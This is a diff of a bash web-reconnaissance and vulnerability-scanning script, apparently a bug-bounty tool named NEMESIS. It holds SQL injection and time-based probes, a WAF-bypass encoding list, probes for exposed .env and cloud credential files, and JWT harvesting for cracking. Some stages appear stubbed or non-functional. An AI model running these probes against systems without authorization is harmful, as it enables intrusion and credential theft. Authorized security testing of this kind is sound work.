-  local RPT="$W/reports/report.html"
-  local rows=""
-  while IFS= read -r line; do
-    local esc; esc=$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')
-    local sev; sev=$(echo "$line" | cut -d'|' -f1)
-    local cls; case "$sev" in CRITICAL) cls=crit;; HIGH) cls=high;; MEDIUM) cls=med;; *) cls=info;; esac
-    rows+="<tr class=\"$cls\"><td>$sev</td><td>$esc</td></tr>"
-  done < <(findings_snapshot)
-  local arts; arts=$(find "$EX" -type f 2>/dev/null | sed "s|$W/||" | sort | sed 's|^|<li>|;s|$|</li>|')
-  cat > "$RPT" <<HTM
-<!DOCTYPE html><html><head><meta charset="utf-8">
-<title>NEMESIS v$VERSION — $DOMAIN</title>
-<style>
-body{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:2em}
-h1{color:#58a6ff}.crit{color:#ff7b72}.high{color:#f0883e}.med{color:#d29922}.info{color:#8b949e}
-table{border-collapse:collapse;width:100%}td,th{border:1px solid #30363d;padding:6px 10px;text-align:left}
-th{background:#161b22;color:#58a6ff}.box{background:#161b22;border:1px solid #30363d;padding:1em;border-radius:6px;margin:1em 0}
-</style></head><body>
-<h1>NEMESIS v$VERSION — $DOMAIN</h1>
-<p>$(date '+%F %T') · elapsed $(( ($(date +%s)-START)/60 ))m · hosts $(cnt "$W/subs/live.txt" 2>/dev/null) · urls $(cnt "$W/urls/all.txt" 2>/dev/null)</p>
-<div class="box"><h3>Verified findings</h3><table><tr><th>Severity</th><th>Finding</th></tr>$rows</table></div>
-<div class="box"><h3>Exploit artifacts</h3><ul>$arts</ul></div>
-</body></html>
-HTM
-  log OK "report → $RPT"
-}
-gen_report() {
-  step "REPORT — findings · review_medium · md + html"
-  mkdir -p "$W/reports"
-  : > "$W/reports/findings.txt"; : > "$W/reports/review_medium.txt"
-  while IFS= read -r line; do
-    case "$line" in
-      CRITICAL*|HIGH*)   echo "$line" >> "$W/reports/findings.txt" ;;
-      MEDIUM*)           [[ "$F_STRICT" == true ]] && echo "$line" >> "$W/reports/findings.txt" \
-                                                    || echo "$line" >> "$W/reports/review_medium.txt" ;;
-    esac
-  done < <(findings_snapshot)
-  u "$W/reports/findings.txt" "$W/reports/review_medium.txt"
-  gen_md_report; gen_html_report
-  log OK "findings: $(cnt "$W/reports/findings.txt") | medium review: $(cnt "$W/reports/review_medium.txt")"
-  log S "════════════ DONE — $DOMAIN ════════════"
-  echo -e "${G}Reports:${N}  $W/reports/report.html  |  $W/reports/report.md"
-  echo -e "${G}Findings:${N}  $W/reports/findings.txt  (mediums → review_medium.txt)"
-  echo -e "${G}Exploits:${N}  $EX/"
-}
-
-# ─────────────────────────── PIPELINE STAGES ───────────────────────────
-stage_urls() {
-  step "URLS — crawl & harvest (katana/wayback/gau/hakrawler)"
-  mkdir -p "$W/urls" "$W/js"
-  local raw="$W/urls/raw_all.txt"
-  : > "$raw"
-  if has katana; then
-    log I "katana crawl…"
-    timeout "$T_KATANA" katana -list "$W/subs/live.txt" -d "$D_KATANA" -jc -kf all -silent \
-      -H "User-Agent: $(ua)" ${COOKIE:+-H "Cookie: $COOKIE"} -o "$W/urls/katana.txt" 2>/dev/null || true
-    cat "$W/urls/katana.txt" >> "$raw" 2>/dev/null
-  fi
-  for h in "${A[@]+"${A[@]}"}"; do :; done
-  if has gau; then gau --threads 10 --subs "$DOMAIN" 2>/dev/null >> "$raw" || true; fi
-  if has waybackurls; then echo "$DOMAIN" | waybackurls 2>/dev/null >> "$raw" || true; fi
-  if has hakrawler; then
-    cat "$W/subs/live.txt" | hakrawler -d 2 -u -insecure 2>/dev/null >> "$raw" || true
-  fi
-  u "$raw"
-  grep -E '^https?://' "$raw" | grep -Fv -e '.png' -e '.jpg' -e '.jpeg' -e '.gif' -e '.svg' -e '.ico' \
-    -e '.css' -e '.woff' -e '.woff2' -e '.ttf' -e '.eot' -e '.pdf' -e '.zip' -e '.gz' -e '.mp4' -e '.mp3' \
-    -e '.webm' -e '.avi' -e '.mov' -e '.map' -e '.min.js' -e '.js.map' | sort -u > "$W/urls/all.txt"
-  grep -E '\?[^=]+=' "$W/urls/all.txt" | sort -u > "$W/urls/params.txt"
-  grep -E '\.(js|mjs)([?#]|$)' "$W/urls/all.txt" | sort -u > "$W/urls/js_raw.txt"
-  log OK "URLs: $(cnt "$W/urls/all.txt") | with params: $(cnt "$W/urls/params.txt") | js: $(cnt "$W/urls/js_raw.txt")"
-}
-
-stage_js_paths() {
-  step "JS — download · extract paths ONLY · dedupe"
-  mkdir -p "$W/js/paths" "$W/js/raw"
-  local src="$W/urls/js_raw.txt"
-  [[ -s "$src" ]] && cat "$src" >> "$W/js/paths/input.txt"
-  cat "$W/subs/live.txt" | sed 's|/$||;s|$|/|' >> "$W/js/paths/input.txt" 2>/dev/null
-  # discover common JS entry points
-  while IFS= read -r base; do
-    for p in /static/js/main.js /assets/js/app.js /js/app.js /build/bundle.js /static/js/bundle.js \
-             /dist/app.js /public/js/main.js /wp-content/themes/*/js/*.js; do
-      probe "${base}${p}"
-      [[ "$RC" == "200" ]] && echo "${base}${p}" >> "$W/js/paths/input.txt"
-    done
-  done < <(head -5 "$W/subs/live.txt" 2>/dev/null)
-  u "$W/js/paths/input.txt"
-  local i=0; while IFS= read -r js; do
-    i=$((i+1)); local f="$W/js/raw/$(sn "$js").js"
-    [[ -s "$f" ]] && continue
-    curlx -- "$js" -o "$f" 2>/dev/null || true
-    [[ $(wc -c < "$f" 2>/dev/null || echo 0) -lt 8 ]] && rm -f "$f"
-    [[ $((i % 25)) -eq 0 ]] && log I "js downloaded: $i"
-  done < "$W/js/paths/input.txt"
-  local PY="$W/.js_paths.py"
-  cat > "$PY" <<'JPY'
-import os,re,sys
-PATHS=set()
-DROP=("endpoint","scheme","host")
-for f in sys.argv[1:]:
-    if not os.path.isfile(f): continue
-    try: s=open(f,encoding="utf-8",errors="ignore").read()
-    except: continue
-    for m in re.finditer(r'["\'](/[^"\']{2,200})["\']',s):
-        p=m.group(1)
-        if p.startswith("//"): continue
-        if re.search(r'\.(png|jpe?g|gif|svg|ico|css|woff2?|ttf|eot|map|mp[34]|webm|zip|gz|pdf)$',p,re.I): continue
-        if re.search(r'(node_modules|webpack|\.min\.|polyfill|vendor|bootstrap|jquery)',p,re.I): continue
-        p=p.split("?")[0].split("#")[0]
-        if len(p)<3 or p in ("/","//"): continue
-        PATHS.add(p)
-for p in sorted(PATHS): print(p)
-JPY
-  find "$W/js/raw" -name '*.js' -size +8c | xargs -r python3 "$PY" 2>/dev/null | sort -u > "$W/js/paths/all.txt" || true
-  u "$W/js/paths/all.txt"
-  # attach paths to hosts for live probing
-  local HOST; HOST=$(head -1 "$W/subs/live.txt" 2>/dev/null)
-  if [[ -n "$HOST" ]]; then
-    sed "s|^|$HOST|" "$W/js/paths/all.txt" | sort -u > "$W/urls/js_paths_urls.txt"
-  fi
-  log OK "JS files: $(cnt "$W/js/paths/input.txt") | unique paths: $(cnt "$W/js/paths/all.txt")"
-}
-
-stage_fuzz() {
-  step "FUZZ — ffuf content discovery (verified, deduped)"
-  mkdir -p "$W/vulns/fuzz"
-  local WLD="/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
-  [[ ! -f "$WLD" ]] && WLD="/usr/share/seclists/Discovery/Web-Content/common.txt"
-  [[ ! -f "$WLD" ]] && { log W "no seclists — skipping fuzz"; return; }
-  local i=0
-  while IFS= read -r base; do
-    i=$((i+1)); local s; s=$(sn "$base")
-    ffuf -u "${base%/}/FUZZ" -w "$WLD" -t 60 -mc 200,201,204,301,302,307,401,403,500 \
-      -ac -s -of json -o "$W/vulns/fuzz/ffuf_${s}.json" 2>/dev/null || true
-    [[ $((i % 5)) -eq 0 ]] && log I "ffuf hosts: $i"
-  done < <(head -8 "$W/subs/live.txt" 2>/dev/null)
-  find "$W/vulns/fuzz" -name 'ffuf_*.json' -size +10c | xargs -r jq -r '.results[]? | select(.status==200 or .status==301 or .status==302 or .status==401 or .status==403) | .status' {} 2>/dev/null | sort -u > /dev/null || true
-  find "$W/vulns/fuzz" -name 'ffuf_*.json' -size +10c | xargs -r jq -r '.results[]?.input.FUZZ' {} 2>/dev/null | sort -u > "$W/vulns/fuzz/dirs.txt" || true
-  u "$W/vulns/fuzz/dirs.txt"
-  log OK "fuzzed dirs (unique): $(cnt "$W/vulns/fuzz/dirs.txt")"
-}
-
-stage_nuclei() {
-  step "NUCLEI — vuln scan (dedupe by template+host)"
-  mkdir -p "$W/vulns/nuclei"
-  local seen="$W/vulns/nuclei/.seen"; : > "$seen"
-  nuclei -l "$W/subs/live.txt" -t "${NUC_TEMPLATES[@]:-}" -rl "$R_NUCLEI" -timeout "$T_NUCLEI" \
-    -severity critical,high,medium -o "$W/vulns/nuclei/raw.txt" \
-    -stats -silent ${COOKIE:+-H "Cookie: $COOKIE"} 2>/dev/null || true
-  [[ -f "$W/vulns/nuclei/raw.txt" ]] && grep -vE '^\s*$' "$W/vulns/nuclei/raw.txt" | while IFS= read -r line; do
-    local host tpl sev; host=$(echo "$line" | grep -oP '\[(https?://[^]]+)\]' | head -1 | tr -d '[]' || true)
-    tpl=$(echo "$line" | grep -oP '\[[a-z0-9/_-]+\]$' | head -1 | tr -d '[]' || true)
-    sev=$(echo "$line" | grep -oE '\[(critical|high|medium|low|info)\]' | head -1 | tr -d '[]' || echo info)
-    local k="${host}||${tpl}"
-    grep -qF "$k" "$seen" && continue
-    echo "$k" >> "$seen"
-    case "$sev" in
-      critical) echo "CRITICAL|NUCLEI:${tpl}|$host" ;;
-      high)     echo "HIGH|NUCLEI:${tpl}|$host" ;;
-      medium)   echo "MEDIUM|NUCLEI:${tpl}|$host" ;;
-      *)        echo "INFO|NUCLEI:${tpl}|$host" ;;
-    esac >> "$W/vulns/nuclei/parsed.txt"
-  done
-  u "$W/vulns/nuclei/parsed.txt"
-  while IFS='|' read -r sev kind host; do
-    local tpl; tpl="${kind#NUCLEI:}"
-    case "$tpl" in
-      *sqli*|*sql-injection*)      q() { :; }; ;;
-      *lfi*|*path-traversal*|*traversal*) ;;
-      *ssrf*) ;;
-      *rce*|*command-injection*|*cmd-injection*) ;;
-      *ssti*|*template-injection*) ;;
-      *xss*) ;;
-      *idor*|*insecure-direct*) ;;
-      *open-redirect*) ;;
-      *takeover*) ;;
-    esac
-  done < "$W/vulns/nuclei/parsed.txt" 2>/dev/null || true
-  log OK "nuclei parsed: $(cnt "$W/vulns/nuclei/parsed.txt")"
-}
-NEMESIS_EOF
-echo "PART 3 of 6 appended — $(wc -l < /usr/local/bin/bug) lines so far"
-cat >> /usr/local/bin/bug <<'NEMESIS_EOF'
-
-# ─────────────────────────── STAGE: WAF ───────────────────────────
-stage_waf() {
-  step "WAF — detect + enumerate bypass vectors"
-  mkdir -p "$W/vulns/waf"
-  local host; host=$(head -1 "$W/subs/live.txt" 2>/dev/null); [[ -z "$host" ]] && return
-  if has wafw00f; then wafw00f "$host" -a -o "$W/vulns/waf/detect.txt" 2>/dev/null || true; fi
-  local waf; waf=$(grep -iE "waf|firewall|protection" "$W/vulns/waf/detect.txt" 2>/dev/null | grep -viE "no waf|not detected" | head -1 || true)
-  if [[ -n "$waf" ]]; then
-    log H "WAF present: ${waf:0:80}"
-    local P=("id" "select" "<script>" "/etc/passwd" "{{7*7}}" "' OR 1=1--")
-    for p in "${P[@]}"; do
-      local ue; ue="${host}/?q=$(echo "$p" | sed 's/ /%20/g')"
-      probe "$ue"
-      if [[ "$RC" =~ ^(403|406|429|418|500)$ || "$RC" == "000" ]]; then
-        echo "BLOCKED|$p|${RC}" >> "$W/vulns/waf/blocked_payloads.txt"
-      fi
-    done
-    echo "BYPASS_HINTS" >> "$W/vulns/waf/notes.txt"
-    cat >> "$W/vulns/waf/notes.txt" <<'WAFN'
-# Encoding bypass ladder:
-# 1. URL encode once/twice  2. mixed case 3. null byte %00  4. tab/newline (\t, %09, %0a)
-# 5. unicode (%u0027, %efbc87)  6. chunked TE  7. param pollution (?id=1&id=2)
-# 8. JSON/XML content-type switch  9. comment obfuscation 10. HTTP/1.0 vs 1.1
-WAFN
-    u "$W/vulns/waf/blocked_payloads.txt"
-  else log OK "no WAF detected"
-  fi
-}
-
-# ─────────────────────────── STAGE: WEB (FINGERPRINT + XSS + SQLI + LFI + SSRF + CMDI + SSTI) ───────────────────────────
-stage_web() {
-  step "WEB — fingerprint · injection auto-detect → verify"
-  local O="$W/vulns/web"; mkdir -p "$O"
-  # fingerprint (tech) for SSTI/JWT targets
-  local host; host=$(head -1 "$W/subs/live.txt" 2>/dev/null)
-  if [[ -n "$host" ]]; then
-    probe "$host"
-    echo "$RB" | grep -oiE "generator[^>]*|x-powered-by[^>]*|server: [^<]*" >> "$O/banner.txt" 2>/dev/null || true
-    curlx -D - -o /dev/null -- "$host" 2>/dev/null | grep -iE "^(server|x-powered-by|x-generator|via):" >> "$O/banner.txt" || true
-  fi
-  if has whatweb; then whatweb -a 3 "$host" --log-json="$W/subs/whatweb.json" >/dev/null 2>&1 || true; fi
-  # XSS via dalfox
-  if has dalfox && [[ -s "$W/urls/params.txt" ]]; then
-    log I "dalfox reflected-XSS…"
-    timeout 900 dalfox file "$W/urls/params.txt" --no-spinner --skip-bav -b "${COLLECTOR:-}" \
-      -o "$O/dalfox_raw.txt" ${COOKIE:+--cookie "$COOKIE"} >/dev/null 2>&1 || true
-    grep -oE '^https?://[^ ]+' "$O/dalfox_raw.txt" 2>/dev/null | sort -u | head -15 | while IFS= read -r ux; do
-      local pl; pl=$(grep -A1 "$ux" "$O/dalfox_raw.txt" 2>/dev/null | grep -oE '<[^>]{5,120}>' | head -1 || true)
-      echo "HIGH|XSS|${pl:-dalfox_verified}|$ux" >> "$O/reflected_xss.txt"
-      qadd high xss "${pl:-dalfox_verified}|$ux"
-    done
-  fi
-  # SQLi via manual probes on param URLs
-  if [[ -s "$W/urls/params.txt" ]]; then
-    head -60 "$W/urls/params.txt" | while IFS= read -r u; do
-      local base; base=$(echo "$u" | grep -oP '^https?://[^/]+')
-      for pm in "'" '"' "')" "';" "%27"; do
-        local t; t=$(echo "$u" | qsreplace "$pm" 2>/dev/null)
-        probe "$t"
-        if [[ "$RC" == "500" ]] || echo "$RB" | grep -qiE "sql (syntax|error)|mysql|postgres|sqlite|ora-[0-9]+|microsoft.*odbc|unclosed quotation"; then
-          echo "HIGH|SQLI|${pm}|$t" >> "$O/sqli_probes.txt"
-          qadd high sqli "$t"
-          break
-        fi
-      done
-      for s in "sleep(3)" "pg_sleep(3)" "WAITFOR DELAY '0:0:3'" "benchmark(10000000,md5(1))"; do
-        local t2; t2=$(echo "$u" | qsreplace "$s" 2>/dev/null)
-        local t0; t0=$(date +%s%N)
-        local code; code=$(curlx -o /dev/null -w '%{http_code}' -- "$t2" 2>/dev/null || echo 000)
-        local t1; t1=$(date +%s%N)
-        local ms; ms=$(( (t1-t0)/1000000 ))
-        if [[ "$code" =~ ^(200|302)$ && "$ms" -gt 2800 ]]; then
-          echo "HIGH|SQLI-TIME|${ms}ms|$t2" >> "$O/sqli_time.txt"
-          qadd high sqli "$t2"
-          break
-        fi
-      done
-    done
-  fi
-  u "$O/sqli_probes.txt" "$O/sqli_time.txt" "$O/reflected_xss.txt"
-  log OK "XSS: $(cnt "$O/reflected_xss.txt") | SQLi: $(cnt "$O/sqli_probes.txt")+$(cnt "$O/sqli_time.txt")"
-}
-
-# ─────────────────────────── STAGE: AUTHZ ───────────────────────────
-stage_authz() {
-  step "AUTHZ — admin/panel discovery + JWT hunting"
-  local O="$W/vulns/authz"; mkdir -p "$O"
-  local PANELS=("admin" "admin/login" "administrator" "wp-admin" "login" "signin" "auth/login" "api/v1/admin" "console" "dashboard" "cpanel" "manager")
-  while IFS= read -r base; do
-    for p in "${PANELS[@]}"; do
-      probe "${base%/}/${p}"
-      if [[ "$RC" =~ ^(200|302)$ ]]; then
-        soft404 "${base%/}/${p}" "$RB" && continue
-        echo "LOGIN_PANEL|${RC}|${base%/}/${p}" >> "$O/panels.txt"
-        log H "Login/admin (verified): ${base%/}/${p} [${RC}]"
-      fi
-    done
-  done < <(head -10 "$W/subs/live.txt" 2>/dev/null)
-  # JWT hunt
-  grep -rhoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' "$W" --include='*.txt' --include='*.json' 2>/dev/null | sort -u > "$W/js/jwts.txt" || true
-  u "$W/js/jwts.txt" "$O/panels.txt"
-  [[ -s "$W/js/jwts.txt" ]] && log H "JWT tokens found: $(cnt "$W/js/jwts.txt") → queued for crack/forge"
-  log OK "panels: $(cnt "$O/panels.txt") | jwt: $(cnt "$W/js/jwts.txt")"
-}
-
-# ─────────────────────────── STAGE: CLOUD ───────────────────────────
-stage_cloud() {
-  step "CLOUD — sensitive exposure · buckets · tech paths"
-  local O="$W/vulns/cloud"; mkdir -p "$O"
-  local META_FILES=("/.git/config" "/.env" "/.env.production" "/.env.local" "/config.json" "/config.php" "/config.yml" "/.htaccess" "/.svn/entries" "/.DS_Store" "/debug" "/actuator" "/actuator/env" "/actuator/heapdump" "/swagger-ui.html" "/server-status" "/phpinfo.php" "/wp-config.php.bak" "/backup.zip" "/db.sql" "/dump.sql" "/.ftpconfig" "/.aws/credentials" "/.dockerenv" "/Dockerfile" "/docker-compose.yml" "/Procfile" "/robots.txt")
-  while IFS= read -r base; do
-    for p in "${META_FILES[@]}"; do
-      probe "${base}${p}"
-      if [[ "$RC" == "200" && "$RL" -gt 10 ]]; then
-        soft404 "${base}${p}" "$RB" && continue
-        local hit=""
-        case "$p" in
-          *.git/*)        echo "$RB" | grep -q "repositoryformatversion" && hit="GIT_EXPOSED|${base}${p}" ;;
-          *.env*)         echo "$RB" | grep -qE "=|KEY|SECRET|TOKEN|PASSWORD|DB_" && hit="ENV_EXPOSED|${base}${p}" ;;
-          *actuator*)     echo "$RB" | grep -qiE "spring|beans|env|health|mappings" && hit="ACTUATOR|${base}${p}" ;;
-          *phpinfo*)      echo "$RB" | grep -qi "php version" && hit="PHPINFO|${base}${p}" ;;
-          *swagger*)      echo "$RB" | grep -qiE "swagger|openapi" && hit="SWAGGER|${base}${p}" ;;
-          *)              hit="EXPOSED_FILE|${base}${p}|${RL}b" ;;
+# ══════════════════════════════════════════════════════
+# ARGUMENT PARSING
+# ══════════════════════════════════════════════════════
+parse_args() {
+    [[ $# -eq 0 ]] && show_help
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            -d)              DOMAIN="$(echo ${2:-} | sed 's|https\?://||g' | sed 's|/$||g')"; shift ;;
+            --quick)         F_QUICK=true ;;
+            --deep)          F_DEEP=true ;;
+            --no-exploit)    F_NO_EXPLOIT=true ;;
+            --resume)        F_RESUME=true ;;
+            --silent)        F_SILENT=true ;;
+            --no-banner)     F_BANNER=false ;;
+            --install)       F_INSTALL=true ;;
+            --update-nuclei) F_UPDATE_NUCLEI=true ;;
+            --cookie)        SESSION_COOKIE="${2:-}"; shift ;;
+            --header)        CUSTOM_HEADERS+=("${2:-}"); shift ;;
+            --proxy)         PROXY_URL="${2:-}"; shift ;;
+            --wordlist)      CUSTOM_WL="${2:-}"; shift ;;
+            --threads)       CUSTOM_THREADS="${2:-}"; shift ;;
+            --rate)          CUSTOM_RATE="${2:-}"; shift ;;
+            --timeout)       TIMEOUT_CONN="${2:-10}"; shift ;;
+            -sub)            M_SUB=true ;;
+            -one)            M_ONE=true ;;
+            -url)            M_URL=true ;;
+            -we)             M_WE=true ;;
+            -js)             M_JS=true ;;
+            -fuzz)           M_FUZZ=true ;;
+            -ports)          M_PORTS=true ;;
+            -vuln)           M_VULN=true ;;
+            -exploit)        M_EXPLOIT=true ;;
+            -nuclei)         M_NUCLEI_ONLY=true ;;
+            -xss)            M_XSS=true ;;
+            -sqli)           M_SQLI=true ;;
+            -ssrf)           M_SSRF=true ;;
+            -lfi)            M_LFI=true ;;
+            -csrf)           M_CSRF=true ;;
+            -cors)           M_CORS=true ;;
+            -idor)           M_IDOR=true ;;
+            -oauth)          M_OAUTH=true ;;
+            -tech)           M_TECH=true ;;
+            -report)         M_REPORT=true ;;
+            -waf)            M_WAF=true ;;
+            -api)            M_API=true ;;
+            -pmf)            M_PMF=true ;;
+            -scope)          SCOPE_FILE="${2:-}"; M_SCOPE=true; shift ;;
+            -h|--help|-help) show_help ;;
+            *)               log_err "Unknown option: $1"; show_help ;;
         esac
-        [[ -n "$hit" ]] && { echo "$hit" >> "$O/sensitive.txt"; log H "$hit"; }
-      fi
+        shift
     done
-  done < <(head -8 "$W/subs/live.txt" 2>/dev/null)
-  # buckets
-  for n in "$DOMAIN" "${DOMAIN//./-}" "backup.$DOMAIN" "uploads.$DOMAIN" "assets.$DOMAIN" "media.$DOMAIN" "static.$DOMAIN"; do
-    probe "https://$n.s3.amazonaws.com/?list-type=2&max-keys=3"
-    echo "$RB" | grep -q "ListBucketResult" && { echo "S3_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public S3 (verified): $n"; }
-    probe "https://storage.googleapis.com/$n?prefix="
-    echo "$RB" | grep -q "ListBucketResult" && { echo "GCS_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public GCS (verified): $n"; }
-    probe "https://$n.blob.core.windows.net/?comp=list"
-    echo "$RB" | grep -q "EnumerationResults" && { echo "AZURE_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public Azure blob (verified): $n"; }
-  done
-  u "$O/sensitive.txt" "$O/buckets.txt"
-  log OK "sensitive: $(cnt "$O/sensitive.txt") | buckets: $(cnt "$O/buckets.txt")"
+
+    # Deep mode overrides
+    if [[ "$F_DEEP" == true ]]; then
+        T_HTTPX=100; T_NUCLEI=100; R_NUCLEI=300
+        T_FFUF=200;  T_KATANA=100; D_KATANA=6
+        T_DALFOX=60; MAX_SUBS_WB=80
+    fi
+
+    # Custom thread/rate overrides
+    [[ -n "$CUSTOM_THREADS" ]] && T_HTTPX="$CUSTOM_THREADS" T_NUCLEI="$CUSTOM_THREADS" T_FFUF="$CUSTOM_THREADS"
+    [[ -n "$CUSTOM_RATE" ]]    && R_NUCLEI="$CUSTOM_RATE"
 }
 
-# ─────────────────────────── STAGE: API ───────────────────────────
-stage_api() {
-  step "API — swagger · graphql · undocumented"
-  local O="$W/api"; mkdir -p "$O"
-  local AP=("/swagger" "/swagger-ui.html" "/swagger/index.html" "/v2/api-docs" "/v3/api-docs" "/openapi.json" "/api/openapi.json" "/api/docs" "/docs" "/redoc" "/api/swagger.json")
-  local GQ=("/graphql" "/graphiql" "/api/graphql" "/v1/graphql" "/gql" "/query")
-  while IFS= read -r base; do
-    for p in "${AP[@]}"; do
-      probe "${base}${p}"
-      [[ "$RC" == "200" ]] && echo "$RB" | grep -qiE "(swagger|openapi|api-docs|\"paths\")" && {
-        echo "${base}${p}" >> "$O/specs.txt"; log H "API spec (verified): ${base}${p}"; }
-    done
-    for p in "${GQ[@]}"; do
-      local g; g=$(curlx -X POST -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -- "${base}${p}" 2>/dev/null | head -c 1500 || true)
-      if echo "$g" | grep -qiE "(__typename|\"errors\")"; then
-        echo "${base}${p}" >> "$O/graphql.txt"; log H "GraphQL (verified): ${base}${p}"
-        local gi; gi=$(curlx -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' -- "${base}${p}" 2>/dev/null | head -c 800 || true)
-        echo "$gi" | grep -q "__schema" && { echo "${base}${p}" >> "$O/graphql_introspection.txt"; log H "introspection OPEN: ${base}${p}"; }
-      fi
-    done
-  done < <(head -6 "$W/subs/live.txt" 2>/dev/null)
-  for b in /api /api/v1 /api/v2 /api/v3 /rest /backend /internal; do
-    probe "https://$DOMAIN${b}"
-    [[ "$RC" =~ ^(200|201|401|403)$ ]] && { soft404 "https://$DOMAIN${b}" "$RB" || echo "API_BASE[${RC}]|${b}" >> "$O/bases.txt"; }
-  done
-  u "$O/specs.txt" "$O/graphql.txt" "$O/graphql_introspection.txt" "$O/bases.txt"
-  log OK "specs: $(cnt "$O/specs.txt") | graphql: $(cnt "$O/graphql.txt") | introspection: $(cnt "$O/graphql_introspection.txt")"
+# ══════════════════════════════════════════════════════
+# LOGGING
+# ══════════════════════════════════════════════════════
+log_info()  {
+    [[ "$F_SILENT" == true ]] && return
+    local ts; ts=$(date '+%H:%M:%S')
+    echo -e "${SYM_INFO} ${DIM}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
 }
-NEMESIS_EOF
-echo "PART 4 of 6 appended — $(wc -l < /usr/local/bin/bug) lines so far"
-cat >> /usr/local/bin/bug <<'NEMESIS_EOF'
+log_ok()    {
+    local ts; ts=$(date '+%H:%M:%S')
+    echo -e "${SYM_OK} ${GREEN}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+}
+log_warn()  {
+    local ts; ts=$(date '+%H:%M:%S')
+    echo -e "${SYM_WARN} ${YELLOW}[${ts}]${NC} ${BOLD}$*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+}
+log_err()   {
+    local ts; ts=$(date '+%H:%M:%S')
+    echo -e "${SYM_FAIL} ${RED}[${ts}]${NC} $*" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+}
 
-# ─────────────────────────── STAGE: PARAM FUZZ ───────────────────────────
-stage_param_fuzz() {
-  step "PARAM FUZZ — hidden params + type confusion + JSON mutation"
-  local O="$W/vulns/param_fuzz"; mkdir -p "$O"
-  local PW="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
-  [[ ! -f "$PW" ]] && PW="/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
-  [[ ! -f "$PW" ]] && PW="/usr/share/wordlists/dirb/common.txt"
-  if has ffuf && [[ -s "$W/urls/params.txt" ]]; then
-    head -10 "$W/urls/params.txt" | while IFS= read -r u; do
-      local b s; b="${u%%\?*}"; s=$(sn "$u")
-      ffuf -u "${b}?FUZZ=nemesis_probe" -w "$PW" -t 40 -mc 200,201,302 -ac -s \
-        -of json -o "$O/ffuf_${s}.json" 2>/dev/null || true
+# ── Global duplicate suppression: each unique finding prints ONCE ──
+declare -A _HIT_SEEN=()
+log_hit() {
+    local key="$*"
+    [[ -n "${_HIT_SEEN[$key]:-}" ]] && return
+    _HIT_SEEN[$key]=1
+    local ts; ts=$(date '+%H:%M:%S')
+    echo -e "${SYM_HIT} ${BOLD}${RED}[${ts}] ▶ FINDING: $*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+}
+
+# ── Append to result file ONLY if line is new; 0=new 1=dup ──
+uniq_add() {
+    local file="$1"; shift
+    mkdir -p "$(dirname "$file")" 2>/dev/null || true
+    touch "$file" 2>/dev/null || true
+    local line="$*"
+    grep -qxF -- "$line" "$file" 2>/dev/null && return 1
+    echo "$line" >> "$file"
+    return 0
+}
+
+# ── Native bash reachability filter — keep live, non-WAF-blocked URLs ──
+active_filter() {
+    local in_file="$1" out_file="$2" max="${3:-30}"
+    : > "$out_file"
+    local n=0
+    while IFS= read -r url && [[ $n -lt $max ]]; do
+        [[ -z "$url" ]] && continue
+        local code
+        code=$(_curl --max-time 8 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
+        case "$code" in
+            200|201|202|204|301|302|307|308|401|404|405|500|501|502|503)
+                echo "$url" >> "$out_file"; n=$((n+1)) ;;
+        esac
+    done < "$in_file"
+    sort -u -o "$out_file" "$out_file" 2>/dev/null || true
+}
+
+# ── Final pass: every result file in the workspace is unique ──
+dedupe_workspace() {
+    log_info "Deduplicating all result files..."
+    local n=0
+    while IFS= read -r f; do
+        sort -u -o "$f" "$f" 2>/dev/null && n=$((n+1)) || true
+    done < <(find "$WORKSPACE" -name "*.txt" -type f 2>/dev/null)
+    log_ok "Deduplicated $n files"
+}
+
+log_step()  {
+    local ts; ts=$(date '+%H:%M:%S')
+    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+    echo -e "  ${BOLD}${MAGENTA}╔══════════════════════════════════════════════════════╗${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+    echo -e "  ${BOLD}${MAGENTA}║  ${YELLOW}⚡${NC} ${BOLD}${WHITE}[$ts] $*${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+    echo -e "  ${BOLD}${MAGENTA}╚══════════════════════════════════════════════════════╝${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+}
+log_section() {
+    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+    echo -e "  ${BOLD}${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+    printf "  ${BOLD}${BLUE}│  ${YELLOW}%-60s${BLUE}│${NC}\n" "⚡  $1" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+    echo -e "  ${BOLD}${BLUE}└──────────────────────────────────────────────────────────────┘${NC}" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+    echo "" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+}
+progress()  {
+    SCAN_STEP=$((SCAN_STEP + 1))
+    local pct=$(( SCAN_STEP * 100 / SCAN_TOTAL ))
+    local fill=$(( pct / 4 ))
+    local bar=""
+    for ((i=0;i<fill;i++)); do bar+="█"; done
+    for ((i=fill;i<25;i++)); do bar+="░"; done
+    echo -e "\n${CYAN}  ▸ [${bar}] ${pct}% — ${BOLD}$1${NC}\n" | tee -a "${LOG_MASTER:-/tmp/bug.log}"
+}
+
+# ══════════════════════════════════════════════════════
+# HELPERS
